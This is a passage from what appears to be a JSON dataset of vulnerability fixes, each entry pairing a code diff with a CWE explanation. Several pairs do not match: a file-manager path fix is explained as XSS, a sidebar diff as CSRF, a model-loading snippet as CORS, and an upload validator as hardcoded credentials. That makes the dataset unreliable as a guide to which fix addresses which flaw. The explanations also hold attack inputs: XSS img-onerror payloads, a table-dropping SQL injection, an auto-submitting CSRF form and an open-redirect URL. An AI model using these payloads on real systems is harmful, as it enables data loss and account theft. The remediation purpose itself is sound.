        "explanation": "Vulnerability Type:\nCWE-601: URL Redirection to Untrusted Site ('Open Redirect')\nProof of Concept:\nVulnerable Code:\n@typed_endpoint\ndef realm_redirect(request: HttpRequest, *, next: str = \"\") -> HttpResponse:\n    if request.method == \"POST\":\n        form = RealmRedirectForm(request.POST)\n        if form.is_valid():\n            subdomain = form.cleaned_data[\"subdomain\"]\n            realm = get_realm(subdomain)\n            redirect_to = urljoin(realm.url, settings.HOME_NOT_LOGGED_IN)\n\n            if next:\n                redirect_to = append_url_query_string(\n                    redirect_to, urlencode({REDIRECT_FIELD_NAME: next})\n                )\n\n            return HttpResponseRedirect(redirect_to)\nExplanation:\n\u2022\tThe next parameter comes from user input.\n\u2022\tIt is directly appended into a redirect URL without validating whether next is safe (e.g., it could point to an external malicious domain).\n\u2022\tAn attacker could craft a URL like:\n\u2022\thttps://trustedsite.com/accounts/realm_redirect?next=https://malicious.com\nwhich, after submission, redirects users to https://malicious.com.\nSolution:\n\u2022\tValidate the next parameter to ensure it is internal (relative URL only).\n\u2022\tReject full external URLs (those containing a domain).\nExample fix:\nfrom django.utils.http import url_has_allowed_host_and_scheme\n\nif next and url_has_allowed_host_and_scheme(next, allowed_hosts={request.get_host()}):\n    redirect_to = append_url_query_string(\n        redirect_to, urlencode({REDIRECT_FIELD_NAME: next})\n    )\nSeverity: High\n\nRoot Cause:\nThe application fails to properly validate user-supplied URL parameters (specifically next) before redirecting users, which allows attackers to control redirection targets.\n\nExploit Scenario:\nAn attacker crafts a link with a malicious next parameter and tricks users into clicking it. After login or realm selection, users are redirected to a phishing website that looks like the real application, leading to credential theft or session hijacking.\nWhy It Happens:\nThe next parameter from user input is blindly appended to internal URLs without validating that it leads to an internal location, allowing attackers to supply fully external URLs.\nSecurity Implications:\n\u2022\tPhishing attacks\n\u2022\tUser session hijacking\n\u2022\tLoss of user trust\n\u2022\tPotential credential theft\n\u2022\tSerious damage to application reputation\n\nSuggested Fix:\ndiff --git a/registration.py b/registration.py\nindex abcdef1..1234567 100644\n--- a/registration.py\n+++ b/registration.py\n@@ def realm_redirect(request: HttpRequest, *, next: str = \"\") -> HttpResponse:\n-            if next:\n-                redirect_to = append_url_query_string(\n-                    redirect_to, urlencode({REDIRECT_FIELD_NAME: next})\n-                )\n+            from django.utils.http import url_has_allowed_host_and_scheme\n+            if next and url_has_allowed_host_and_scheme(next, allowed_hosts={request.get_host()}):\n+                redirect_to = append_url_query_string(\n+                    redirect_to, urlencode({REDIRECT_FIELD_NAME: next})\n+                )\n\n"
    },
    "152": {
        "diff": "--- FileManager.py\t2025-04-29 04:22:22.000000000 -0400\n+++ FileManager-new.py\t2025-04-29 04:22:22.000000000 -0400\n@@ -1,103 +1,116 @@\n import os\n import shutil\n import subprocess\n+import re\n+from pathlib import Path\n+\n+def sanitize_input(user_input):\n+    \"\"\"Validate input contains only safe characters\"\"\"\n+    return re.match(r'^[\\w\\-\\.]+$', user_input)\n+\n+def safe_path_join(base, *paths):\n+    \"\"\"Secure path construction with traversal protection\"\"\"\n+    try:\n+        return str(Path(base).joinpath(*paths).resolve().relative_to(Path(base).resolve()))\n+    except ValueError:\n+        raise ValueError(\"Invalid path traversal attempt\")\n \n def moveFile(filepath):\n-    if filepath:\n-        print(\"File found at: \" + filepath)\n-        print(\"---\" * 30)\n-        parent_folder = input(\"What is the parent of this folder: \")\n-        folder_name = input(\"Enter folder name to move file into: \")\n-        destination_path = os.path.join(os.path.expanduser(\"~\"), parent_folder, folder_name)\n-        print(\"Destination path: \" + destination_path)\n-        confirm = input(\"Are you sure you want to do this? (Y/N): \").lower()\n-        if confirm == \"y\":\n-            try:\n-                os.makedirs(destination_path, exist_ok=True)\n-                shutil.move(filepath, os.path.join(destination_path, os.path.basename(filepath)))\n-                print(\"File moved successfully!\")\n-            except Exception as e:\n-                print(\"Error: \" + str(e))\n-        else:\n-            print(\"File not moved.\")\n-    else:\n+    if not filepath:\n         print(\"File not found.\")\n+        return\n+\n+    print(f\"File found at: {filepath}\")\n+    print(\"---\" * 30)\n+    \n+    parent_folder = input(\"Parent folder name: \")\n+    if not sanitize_input(parent_folder):\n+        print(\"Invalid folder name\")\n+        return\n+\n+    folder_name = input(\"Folder name: \")\n+    if not sanitize_input(folder_name):\n+        print(\"Invalid folder name\")\n+        return\n+\n+    try:\n+        base_dir = Path.home() / \"secure_storage\"\n+        destination_path = safe_path_join(base_dir, parent_folder, folder_name)\n+        final_path = Path(base_dir) / destination_path\n+        \n+        print(f\"Destination path: {final_path}\")\n+        confirm = input(\"Confirm (Y/N): \").lower()\n+        \n+        if confirm == \"y\":\n+            final_path.mkdir(parents=True, exist_ok=True)\n+            shutil.move(filepath, final_path / Path(filepath).name)\n+            print(\"File moved securely!\")\n+    except Exception as e:\n+        print(f\"Security error: {str(e)}\")\n \n def openFile(found_file=None):\n     if not found_file:\n-        found_file = input(\"Enter the file name to search and open: \")\n+        found_file = input(\"File to open: \")\n \n-    file_found = False\n-    for dirpath, dirnames, filenames in os.walk(os.path.expanduser(\"~\")):  # Update the base directory to search for files\n-        for file in filenames:\n-            if found_file in file:\n-                found_file = os.path.join(dirpath, file)\n-                file_found = True\n-                break\n-        if file_found:\n-            break\n+    try:\n+        # Validate path exists and is in allowed locations\n+        file_path = Path(found_file).resolve()\n+        allowed_base = Path.home()\n+        \n+        if not str(file_path).startswith(str(allowed_base)):\n+            raise ValueError(\"Access restricted to user directory\")\n \n-    if file_found:\n-        print(\"File found at:\", found_file)\n-        subprocess.run(['open', found_file])  # Open the file with default macOS application\n-    else:\n-        print(\"File not found.\")\n+        # Safe open methods\n+        if os.name == 'nt':\n+            os.startfile(file_path)\n+        else:\n+            subprocess.run(['xdg-open', str(file_path)], check=True)\n+    except Exception as e:\n+        print(f\"Secure open failed: {str(e)}\")\n \n-        \n def searchComputer():\n-    filename = input(\"Enter the file name to search: \")\n-    filetype = input(\"Enter the file type: \")\n-    found_file = None\n-    for dirpath, dirnames, filenames in os.walk('/'):  # Update the base directory to search for files\n-        for file in filenames:\n-            if filename in file and file.endswith(\".\" + filetype):\n-                found_file = os.path.join(dirpath, file)\n-                break\n-        if found_file:\n-            break\n+    filename = input(\"Filename: \")\n+    filetype = input(\"Filetype: \")\n \n-    if found_file:\n-        print(\"File found at:\", found_file)\n-        return found_file\n-    \n-    else:\n-        print(\"File not found.\")\n+    if not sanitize_input(filename) or not sanitize_input(filetype):\n+        print(\"Invalid input detected\")\n         return None\n \n-# Update the code to set the filepath variable before calling moveFile or openFile\n+    try:\n+        search_base = Path.home()\n+        for dirpath, _, filenames in os.walk(search_base):\n+            for file in filenames:\n+                if (filename in file and file.endswith(f\".{filetype}\")):\n+                    found_path = Path(dirpath) / file\n+                    print(f\"Found: {found_path}\")\n+                    return str(found_path)\n+        print(\"File not found\")\n+        return None\n+    except Exception as e:\n+        print(f\"Search error: {str(e)}\")\n+        return None\n \n def main():\n-    global filepath\n     while True:\n-        print(\"1. Move File\")\n-        print(\"2. Open File\")\n-        print(\"3. Search Computer\")\n-        print(\"4. Exit\")\n-        choice = input(\"Enter your choice (1/2/3/4): \")\n+        print(\"\\n1. Move File\\n2. Open File\\n3. Search\\n4. Exit\")\n+        choice = input(\"Choice (1-4): \").strip()\n         print(\"---\" * 30)\n         \n         if choice == \"1\":\n             filepath = searchComputer()\n-            moveFile(filepath)\n-            filepath = \"\"\n-\n+            if filepath:\n+                moveFile(filepath)\n         elif choice == \"2\":\n             filepath = searchComputer()\n-            openFile(filepath)\n-            filepath = \"\"\n-\n+            if filepath:\n+                openFile(filepath)\n         elif choice == \"3\":\n-            filepath = searchComputer()\n-\n+            searchComputer()\n         elif choice == \"4\":\n-            print(\"Exiting...\")\n+            print(\"Exiting securely...\")\n             break\n-\n         else:\n-            print(\"Invalid choice. Please choose from 1, 2, 3, or 4.\")\n-            print(\"---\" * 30)\n-            \n-\n+            print(\"Invalid choice\")\n \n if __name__ == \"__main__\":\n     main()\n",
        "explanation": "Vulnerability Type:\nCWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n\nSeverity:\nLow\n\nRoot Cause:\nThe application uses innerHTML to insert user-controlled data (i.e., data.id, data.value, and data.timestamp) directly into the DOM. This practice opens the door for XSS attacks, as malicious input can inject script content that will be interpreted and executed by the browser.\n\nExploit Scenario:\nAn attacker gains access to a gateway and injects a payload such as:\n\n\n{\n  \"id\": \"<img src=x onerror=alert(1)>\",\n  \"value\": \"malicious\",\n  \"timestamp\": \"now\"\n}\nThis payload is passed to the updateTable() function, and the malicious script is rendered and executed in the browser due to unsafe use of innerHTML.\n\nWhy It Happens:\nThe code does not validate or sanitize inputs before assigning them to innerHTML:\n\n\ncell1.innerHTML = data.id;\ncell2.innerHTML = data.value;\ncell3.innerHTML = data.timestamp;\nThis allows any HTML or JavaScript to be injected and interpreted by the browser.\n\nSecurity Implications:\nXSS can allow attackers to:\n\nSteal session cookies\n\nHijack user sessions\n\nModify UI elements to trick users (phishing)\n\nLoad external malware\n\nThis is particularly dangerous in real-time dashboards where multiple users monitor live data feeds.\n\nSuggested Fix:\nReplace all uses of innerHTML with textContent to treat data as plain text rather than HTML:\n\n- cell1.innerHTML = data.id;\n- cell2.innerHTML = data.value;\n- cell3.innerHTML = data.timestamp;\n+ cell1.textContent = data.id;\n+ cell2.textContent = data.value;\n+ cell3.textContent = data.timestamp;\nThis prevents any embedded HTML or script tags from being interpreted.\n\nProof of Concept (PoC):\nInject the following message through the real-time data socket:\n\n\n{\n  \"id\": \"<img src=x onerror=alert('XSS')>\",\n  \"value\": \"100\",\n  \"timestamp\": \"2024-01-01T00:00:00Z\"\n}\nIt will trigger a popup alert if innerHTML is used."
    },
    "164": {
        "diff": "--- billing_system.py\t2025-04-29 06:40:14.000000000 -0400\n+++ billing_system-new.py\t2025-04-29 06:40:14.000000000 -0400\n@@ -7,6 +7,8 @@\n from datetime import date \n import time\n from termcolor import colored\n+import os\n+import bcrypt\n \n global conn, cursor\n conn = connector.connect(host=\"localhost\", database=\"prod\",\n@@ -32,7 +34,9 @@\n         print(text)\n         return login()\n     password = input(' Type your password: ')\n-    if password == '1234':\n+    stored_hash = os.getenv('ADMIN_HASH')  # Pre-computed bcrypt hash\n+    input_hash = bcrypt.hashpw(password.encode(), stored_hash.encode())\n+    if bcrypt.checkpw(password.encode(), stored_hash.encode()):\n         time.sleep(0.5) \n         print(\"Loged in Successfully \u2705\")\n         return main_menu() \n@@ -53,7 +57,7 @@\n \n \n def find_item(no):\n-    cursor.execute('select * from items where id ={}'.format(no))\n+    cursor.execute('select * from items where id = %s', (no,))\n     record = cursor.fetchone()\n     return record\n \n@@ -64,13 +68,10 @@\n     print('-'*100)\n     item_name = input('Enter new Item Name :')\n     item_price = input('Enter Item Price :')\n-    sql = 'select * from items where item_name like \"%{}%\"'.format(item_name)\n-    cursor.execute(sql)\n+    cursor.execute('select * from items where item_name LIKE %s', (\"%\" + item_name + \"%\",))\n     record = cursor.fetchone()\n     if record == None:\n-        sql = 'insert into items(item_name,price) values(\"{}\",{});'.format(\n-            item_name, item_price)\n-        cursor.execute(sql)\n+        cursor.execute('insert into items(item_name,price) values(%s,%s)', (item_name, item_price))\n         print('\\n\\nNew Item added successfully.....\\nPress any key to continue....')\n     else:\n         print('\\n\\nItem Name already Exist.....\\nPress any key to continue....')\n@@ -97,9 +98,7 @@\n     item_id = input('Enter Item ID :')\n     item_name = input('Enter new Item Name :')\n     item_price = input('Enter Item Price :')\n-    sql = 'update items set item_name = \"{}\", price ={} where id={}'.format(\n-        item_id, item_name, item_price)\n-    cursor.execute(sql)\n+    cursor.execute('update items set item_name=%s, price=%s where id=%s', (item_name, item_price, item_id))\n     print('\\n\\nRecord Updated Successfully............')\n \n \n@@ -193,9 +192,7 @@\n     print('-'*100)\n     start_date = input('Enter start Date (yyyy-mm-dd) :')\n     end_date = input('Enter End Date (yyyy-mm-dd) :')\n-    sql = 'select * from bills where bill_date between \"{}\" and \"{}\"'.format(\n-        start_date, end_date)\n-    cursor.execute(sql)\n+    cursor.execute('select * from bills where bill_date BETWEEN %s AND %s', (start_date, end_date))\n     records = cursor.fetchall()\n     clear()\n     print('Bill No         Customer Name          Phone No          Bill Date')\n@@ -261,8 +258,7 @@\n def search_item():\n     clear()\n     item_name =input('Enter Item Name :')\n-    sql ='select * from items where item_name like \"%{}%\";'.format(item_name)\n-    cursor.execute(sql)\n+    cursor.execute('select * from items where item_name LIKE %s', (\"%\" + item_name + \"%\",))\n     records = cursor.fetchall()\n     clear()\n     print('Item Names start with :',item_name)\n",
        "explanation": "Vulnerability Type:\nCWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n\nProof of Concept:\nIn the `lambda_handler.py` file, the functions `return_customer_info` and `place_shoe_order` build SQL queries by directly inserting user-controlled input without any sanitization or parameterization. For example:\n```python\nquery = 'SELECT customerId, customerName, ... FROM CustomerInfo WHERE customerName LIKE \"%' + custName + '%\"'\ncursor.execute(query)\nHere, if custName is crafted maliciously by an attacker, it can manipulate the SQL query structure and inject harmful SQL code.\n\nSeverity: High\n\nRoot Cause: The vulnerable functions directly concatenate user input variables into SQL query strings instead of using parameterized queries. Since user input is included in SQL statements without escaping or proper binding, malicious actors can alter the structure of the SQL command. This insecure practice introduces critical SQL Injection risks.\n\nExploit Scenario: An attacker can supply a malicious CustomerName input such as Alice\"; DROP TABLE CustomerInfo; --, which closes the intended query and adds a second, destructive SQL command. As a result, the CustomerInfo table can be dropped (deleted) from the database, causing data loss and service disruption.\n\nWhy It Happens: The vulnerability occurs because the developer used string concatenation to dynamically construct SQL queries with user inputs. Without validating, escaping, or binding the user data properly, the database engine interprets the crafted input as executable SQL code instead of harmless data, leading to query manipulation.\n\nSecurity Implications: Successful exploitation of this vulnerability can lead to severe consequences, including unauthorized modification or destruction of data, data leakage, unauthorized access to sensitive information, complete database compromise, and potential escalation of privileges. This can severely impact the confidentiality, integrity, and availability of the application\u2019s data.\n\nSuggested Fix: The code should be refactored to use parameterized queries (also known as prepared statements) to separate query logic from user-supplied values. This ensures that user input is always treated strictly as data, preventing it from being executed as part of SQL commands. For example:\n\n\nquery = 'SELECT customerId, customerName, ... FROM CustomerInfo WHERE customerName LIKE ?'\ncursor.execute(query, (f'%{custName}%',))\nUsing parameter binding provides a clean and secure method of constructing SQL queries and fully mitigates SQL Injection risks."
    },
    "137": {
        "diff": "--- a/src/components/Sidebar.js\n+++ b/src/components/Sidebar.js\n@@\n import React from \"react\";\n import { ImHome } from \"react-icons/im\";\n import { FaSearch } from \"react-icons/fa\";\n import { FaMusic } from \"react-icons/fa6\";\n import { BiSolidNotification } from \"react-icons/bi\";\n import { MdExplore } from \"react-icons/md\";\n import { BsChatHeartFill } from \"react-icons/bs\";\n import { CgProfile } from \"react-icons/cg\";\n import { IoReorderThree } from \"react-icons/io5\";\n import \"./css/sidebar.css\";\n+import { Link } from \"react-router-dom\";\n import { useAuth } from \"../context/auth\";\n\n const Sidebar = () => {\n   const [auth, setAuth] = useAuth();\n+\n+  const isValidUserId = (id) => {\n+    const pattern = /^[a-zA-Z0-9_-]+$/; // allow safe slugs\n+    return typeof id === 'string' && pattern.test(id);\n+  };\n+\n+  const profileUrl = isValidUserId(auth?.user?.userId)\n+    ? `/profile/${auth.user.userId}`\n+    : \"/profile\";\n+\n   return (\n     <>\n       <div className=\"sidebar-container\">\n         <p className=\"logo-heading\">Hipogram</p>\n         <div className=\"side-list-icon-container\">\n           <ul className=\"list-container\">\n             <li className=\"list-icon\">\n-              <a href=\"/\" className=\"side-nav-link\">\n+              <Link to=\"/\" className=\"side-nav-link\">\n                 <ImHome />\n                 <p className=\"list-text\">Home</p>\n-              </a>\n+              </Link>\n             </li>\n             <li className=\"list-icon\">\n-              <a href=\"/search\" className=\"side-nav-link\">\n+              <Link to=\"/search\" className=\"side-nav-link\">\n                 <FaSearch />\n                 <p className=\"list-text\">Search</p>\n-              </a>\n+              </Link>\n             </li>\n             <li className=\"list-icon\">\n-              <a href=\"/music\" className=\"side-nav-link\">\n+              <Link to=\"/music\" className=\"side-nav-link\">\n                 <FaMusic />\n                 <p className=\"list-text\">Music</p>\n-              </a>\n+              </Link>\n             </li>\n             <li className=\"list-icon\">\n-              <a href=\"/notifications\" className=\"side-nav-link\">\n+              <Link to=\"/notifications\" className=\"side-nav-link\">\n                 <BiSolidNotification />\n                 <p className=\"list-text\">Notification</p>\n-              </a>\n+              </Link>\n             </li>\n             <li className=\"list-icon\">\n-              <a href=\"/explore\" className=\"side-nav-link\">\n+              <Link to=\"/explore\" className=\"side-nav-link\">\n                 <MdExplore />\n                 <p className=\"list-text\">Explore</p>\n-              </a>\n+              </Link>\n             </li>\n             <li className=\"list-icon\">\n-              <a href=\"/messages\" className=\"side-nav-link\">\n+              <Link to=\"/messages\" className=\"side-nav-link\">\n                 <BsChatHeartFill />\n                 <p className=\"list-text\">Messages</p>\n-              </a>\n+              </Link>\n             </li>\n             <li className=\"list-icon\">\n-              <a href={`${auth?.user?.userId}`} className=\"side-nav-link\">\n-                {auth && auth?.user?.profile?.data ? (\n-                  <img\n-                    className=\"sidebar-dp\"\n-                    src={`https://music-api-2rhl.onrender.com/api/v1/auth/user-logo/${auth?.user?._id}`}\n-                    alt=\"\"\n-                    srcset=\"\"\n-                  />\n-                ) : (\n-                  <CgProfile />\n-                )}\n-\n-                <p className=\"list-text\">Profile</p>\n-              </a>\n+              <Link to={profileUrl} className=\"side-nav-link\">\n+                {auth?.user?.profile?.data ? (\n+                  <img\n+                    className=\"sidebar-dp\"\n+                    src={`https://music-api-2rhl.onrender.com/api/v1/auth/user-logo/${auth?.user?._id}`}\n+                    alt=\"User Profile\"\n+                    loading=\"lazy\"\n+                  />\n+                ) : (\n+                  <CgProfile />\n+                )}\n+                <p className=\"list-text\">Profile</p>\n+              </Link>\n             </li>\n           </ul>\n         </div>\n         <div className=\"sidebar-bottom-setting\">\n-          <a href=\"/more\" className=\"side-nav-link\">\n+          <Link to=\"/more\" className=\"side-nav-link\">\n             <IoReorderThree />\n             <p className=\"list-text\">More</p>\n-          </a>\n+          </Link>\n         </div>\n       </div>\n     </>\n   );\n };\n\n export default Sidebar;\n",
        "explanation": "Vulnerability Type:\nCWE-352: Cross-Site Request Forgery (CSRF)\n[Line 1061 1105 1165 1276 6001]\nProof of Concept (Elaborated):\nVulnerable Functions:\n@csrf_exempt\n@require_post\ndef jwt_fetch_api_key(...)\n@csrf_exempt\n@require_post\ndef api_fetch_api_key(...)\n@csrf_exempt\n@require_safe\ndef api_get_server_settings(...)\n@csrf_exempt\ndef saml_sp_metadata(...)\n\nStep-by-Step Explanation:\n1.\tProblem:\no\tThese functions are marked with @csrf_exempt.\no\tThey perform sensitive actions (e.g., fetching API keys, returning sensitive metadata).\no\tNo CSRF token validation means any external malicious page can trick the user's browser into making these requests automatically.\n2.\tHow to Attack:\no\tAn attacker could create a fake page with hidden forms or JavaScript that silently sends POST requests to your application while the user is authenticated.\n3.\tEffect:\no\tUnauthorized actions happen without the user\u2019s intent.\no\tSensitive data like API keys are leaked.\n\nExample Exploit:\nMalicious HTML Form:\n<form action=\"https://yourdomain.com/api/v1/fetch_api_key\" method=\"POST\">\n  <input type=\"hidden\" name=\"username\" value=\"victim@example.com\" />\n  <input type=\"hidden\" name=\"password\" value=\"password\" />\n</form>\n<script>document.forms[0].submit();</script>\nResult:\n\u2022\tThe user is tricked into leaking their API key unknowingly.\n\nSeverity:\nCritical (Full Account Hijack Risk)\n\nRoot Cause:\nThe CSRF protection is explicitly disabled with @csrf_exempt even on endpoints that:\n\u2022\tPerform authentication\n\u2022\tFetch API keys\n\u2022\tProvide sensitive server metadata\n\nExploit Scenario:\nAn attacker sends a malicious link or hosts an auto-submitting form that abuses these APIs while the victim is authenticated, extracting sensitive information like API keys or triggering unintended authentication operations.\n\nWhy It Happens:\nBecause CSRF protection (cross-site request checking) is bypassed (@csrf_exempt) without compensating defenses like:\n\u2022\tCSRF tokens\n\u2022\tDouble-submit cookies\n\u2022\tStrict SameSite cookie attributes\n\nSecurity Implications:\nIf exploited:\n\u2022\tAttacker could steal API keys or session tokens.\n\u2022\tUnauthorized access to user accounts.\n\u2022\tPotential system-wide compromise if admin users are targeted.\n\u2022\tSevere trust loss with users.\n\nSuggested Fix:\n--- auth.py\t2025-04-27\n+++ auth_fixed.py\t2025-04-27\n@@\n- @csrf_exempt\n- @require_post\n- def jwt_fetch_api_key(\n+ @require_post\n+ @csrf_protect\n+ def jwt_fetch_api_key(\n\n- @csrf_exempt\n- @require_post\n- def api_fetch_api_key(\n+ @require_post\n+ @csrf_protect\n+ def api_fetch_api_key(\n\n- @csrf_exempt\n- @require_safe\n- def api_get_server_settings(\n+ @require_safe\n+ @csrf_protect\n+ def api_get_server_settings(\n\n- @csrf_exempt\n- def saml_sp_metadata(\n+ @csrf_protect\n+ def saml_sp_metadata(\n"
    },
    "130": {
        "diff": "state_dict_path = os.path.join(args.repo_path, subfolder, \"diffusion_pytorch_model.bin\")\n\n# Safe: only load as state_dict (not entire model object)\nstate_dict = torch.load(state_dict_path, map_location=\"cpu\")\n\nif not isinstance(state_dict, dict):\n    raise ValueError(\"Loaded file is not a valid state_dict dictionary.\")\n\nmodel.load_state_dict(state_dict)\n",
        "explanation": "Vulnerability Type:\nCWE-942: Permissive Cross-domain Policy with Untrusted Domains\n\nSeverity:\nVery Low\n\nRoot Cause:\nThe application configures CORS middleware to allow all origins (allow_origins=[\"*\"]) without restriction. This means that requests from any domain, including malicious or unauthorized ones, are accepted, making the server vulnerable to cross-origin interactions.\n\nExploit Scenario:\nAn attacker creates a malicious website with JavaScript that sends authenticated requests to the FastAPI backend, exploiting an active user session. Since CORS is configured to accept any origin, the backend responds to the attacker's domain, leaking sensitive information or allowing unauthorized actions like form submission or data extraction.\n\nWhy It Happens:\nCORS is meant to control which domains are permitted to interact with a web server\u2019s resources. By setting allow_origins=[\"*\"], the server removes all restrictions, defeating the purpose of the CORS mechanism. This oversight is often made for convenience in development but should never be used in production.\n\nSecurity Implications:\nIf a user is authenticated (e.g., via cookies or session tokens), a malicious site can make cross-origin API calls on their behalf. This may allow data theft, account manipulation, or unauthorized access to backend features\u2014especially dangerous in applications handling personal or sensitive information.\n\nProof of Concept:\n\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\"*\"],\n    allow_credentials=True,\n    allow_methods=[\"*\"],\n    allow_headers=[\"*\"],\n)\nAny external website can now call APIs with user credentials attached, bypassing origin checks.\n\nSuggested Fix:\nReplace the wildcard origin with a strict list of trusted domains. Limit allowed methods and headers to only what's necessary. Example:\n\n\nallowed_origins = [\"https://yourdomain.com\", \"https://admin.yourdomain.com\"]\n\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=allowed_origins,\n    allow_credentials=True,\n    allow_methods=[\"GET\", \"POST\"],\n    allow_headers=[\"Content-Type\", \"Authorization\"],\n)\nAdditionally, ensure sensitive endpoints are protected by proper authentication and CSRF defenses."
    },
    "101": {
        "diff": "--- old/UploadComponent.js\n+++ new/UploadComponent.js\n@@ -10,8 +10,27 @@\n function UploadComponent() {\n   const [file, setFile] = useState(null);\n\n-  const handleFileChange = (e) => {\n-    setFile(e.target.files[0]);\n+  const handleFileChange = (e) => {\n+    const selectedFile = e.target.files[0];\n+    if (!selectedFile) return;\n+\n+    // Validate file type\n+    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];\n+    if (!allowedTypes.includes(selectedFile.type)) {\n+      alert('Invalid file type. Only JPEG, PNG, or GIF images are allowed.');\n+      return;\n+    }\n+\n+    // Validate file size (optional)\n+    const maxSize = 5 * 1024 * 1024; // 5MB\n+    if (selectedFile.size > maxSize) {\n+      alert('File is too large. Maximum size allowed is 5MB.');\n+      return;\n+    }\n+\n+    setFile(selectedFile);\n+  }\n+\n   return (\n     <div>\n       <input\n         type=\"file\"\n         accept=\"image/*\"\n         onChange={handleFileChange}\n       />\n-      {file && <p>Uploaded: {file.name}</p>}\n+      {file && <p>Ready to upload: {file.name}</p>}\n     </div>\n   );\n }\n",
        "explanation": "Explanation:\nThe affected asset has hardcoded credentials for the database server. The credentials exposed belong to a super user / Administrator. This leads to complete database compromise and exposure to sensitive information.\n\nPOC:\nThe following line hardcodes sensitive credentials:\n\nconn = pymysql.connect(host=\"localhost\",user=\"root\",password=\"root123\",db=\"foodmenu\")\n\n\nRoot Cause :\nLine at the end of the script shop.py:\nconn = pymysql.connect(host=\"localhost\",user=\"root\",password=\"root123\",db=\"foodmenu\")\n\nExploit Scenario:\nIf the code is leaked (e.g., via version control or backups), attackers can access the database with full privileges.\n\nWhy it Happens:\nCredentials are embedded in source code instead of being loaded from a secure environment variable or configuration file.\n\nSecurity Implications:\nFull database compromise\nPotential for lateral movement within the network\n\nSuggested Fix:\nUse environment variables or a secure configuration file to store credentials.\n\nPatch:\n\npython\nimport os\n\nmydb=mysql.connector.connect(\n    host=os.environ['DB_HOST'],\n    user=os.environ['DB_USER'],\n    passwd=os.environ['DB_PASS'],\n    database=os.environ['DB_NAME']\n)"
    },
    "162": {
        "diff": "From f94eb0e2f96782042c96801b5ac448f44f0a81df Mon Sep 17 00:00:00 2001\nFrom: Jack Christensen <jack@jackchristensen.com>\nDate: Sat, 24 Feb 2024 11:08:51 -0600\nSubject: [PATCH] Always wrap arguments in parentheses in the SQL sanitizer\n\n---\n internal/sanitize/sanitize.go      | 14 ++++----------\n internal/sanitize/sanitize_test.go | 20 ++++++++++----------\n 2 files changed, 14 insertions(+), 20 deletions(-)\n\ndiff --git a/internal/sanitize/sanitize.go b/internal/sanitize/sanitize.go\nindex e0c9427cb..4c345d508 100644\n--- a/internal/sanitize/sanitize.go\n+++ b/internal/sanitize/sanitize.go\n@@ -44,18 +44,8 @@ func (q *Query) Sanitize(args ...interface{}) (string, error) {\n \t\t\t\tstr = \"null\"\n \t\t\tcase int64:\n \t\t\t\tstr = strconv.FormatInt(arg, 10)\n-\t\t\t\t// Prevent SQL injection via Line Comment Creation\n-\t\t\t\t// https://github.com/jackc/pgx/security/advisories/GHSA-m7wr-2xf7-cm9p\n-\t\t\t\tif arg < 0 {\n-\t\t\t\t\tstr = \"(\" + str + \")\"\n-\t\t\t\t}\n \t\t\tcase float64:\n-\t\t\t\t// Prevent SQL injection via Line Comment Creation\n-\t\t\t\t// https://github.com/jackc/pgx/security/advisories/GHSA-m7wr-2xf7-cm9p\n \t\t\t\tstr = strconv.FormatFloat(arg, 'f', -1, 64)\n-\t\t\t\tif arg < 0 {\n-\t\t\t\t\tstr = \"(\" + str + \")\"\n-\t\t\t\t}\n \t\t\tcase bool:\n \t\t\t\tstr = strconv.FormatBool(arg)\n \t\t\tcase []byte:\n@@ -68,6 +58,10 @@ func (q *Query) Sanitize(args ...interface{}) (string, error) {\n \t\t\t\treturn \"\", fmt.Errorf(\"invalid arg type: %T\", arg)\n \t\t\t}\n \t\t\targUse[argIdx] = true\n+\n+\t\t\t// Prevent SQL injection via Line Comment Creation\n+\t\t\t// https://github.com/jackc/pgx/security/advisories/GHSA-m7wr-2xf7-cm9p\n+\t\t\tstr = \"(\" + str + \")\"\n \t\tdefault:\n \t\t\treturn \"\", fmt.Errorf(\"invalid Part type: %T\", part)\n \t\t}\ndiff --git a/internal/sanitize/sanitize_test.go b/internal/sanitize/sanitize_test.go\nindex c2ec98f00..e25b78f60 100644\n--- a/internal/sanitize/sanitize_test.go\n+++ b/internal/sanitize/sanitize_test.go\n@@ -127,52 +127,52 @@ func TestQuerySanitize(t *testing.T) {\n \t\t{\n \t\t\tquery:    sanitize.Query{Parts: []sanitize.Part{\"select 42\"}},\n \t\t\targs:     []interface{}{},\n-\t\t\texpected: `select 42`,\n+\t\t\texpected: `select (42)`,\n \t\t},\n \t\t{\n \t\t\tquery:    sanitize.Query{Parts: []sanitize.Part{\"select \", 1}},\n \t\t\targs:     []interface{}{int64(42)},\n-\t\t\texpected: `select 42`,\n+\t\t\texpected: `select (42)`,\n \t\t},\n \t\t{\n \t\t\tquery:    sanitize.Query{Parts: []sanitize.Part{\"select \", 1}},\n \t\t\targs:     []interface{}{float64(1.23)},\n-\t\t\texpected: `select 1.23`,\n+\t\t\texpected: `select (1.23)`,\n \t\t},\n \t\t{\n \t\t\tquery:    sanitize.Query{Parts: []sanitize.Part{\"select \", 1}},\n \t\t\targs:     []interface{}{true},\n-\t\t\texpected: `select true`,\n+\t\t\texpected: `select (true)`,\n \t\t},\n \t\t{\n \t\t\tquery:    sanitize.Query{Parts: []sanitize.Part{\"select \", 1}},\n \t\t\targs:     []interface{}{[]byte{0, 1, 2, 3, 255}},\n-\t\t\texpected: `select '\\x00010203ff'`,\n+\t\t\texpected: `select ('\\x00010203ff')`,\n \t\t},\n \t\t{\n \t\t\tquery:    sanitize.Query{Parts: []sanitize.Part{\"select \", 1}},\n \t\t\targs:     []interface{}{nil},\n-\t\t\texpected: `select null`,\n+\t\t\texpected: `select (null)`,\n \t\t},\n \t\t{\n \t\t\tquery:    sanitize.Query{Parts: []sanitize.Part{\"select \", 1}},\n \t\t\targs:     []interface{}{\"foobar\"},\n-\t\t\texpected: `select 'foobar'`,\n+\t\t\texpected: `select ('foobar')`,\n \t\t},\n \t\t{\n \t\t\tquery:    sanitize.Query{Parts: []sanitize.Part{\"select \", 1}},\n \t\t\targs:     []interface{}{\"foo'bar\"},\n-\t\t\texpected: `select 'foo''bar'`,\n+\t\t\texpected: `select ('foo''bar')`,\n \t\t},\n \t\t{\n \t\t\tquery:    sanitize.Query{Parts: []sanitize.Part{\"select \", 1}},\n \t\t\targs:     []interface{}{`foo\\'bar`},\n-\t\t\texpected: `select 'foo\\''bar'`,\n+\t\t\texpected: `select ('foo\\''bar')`,\n 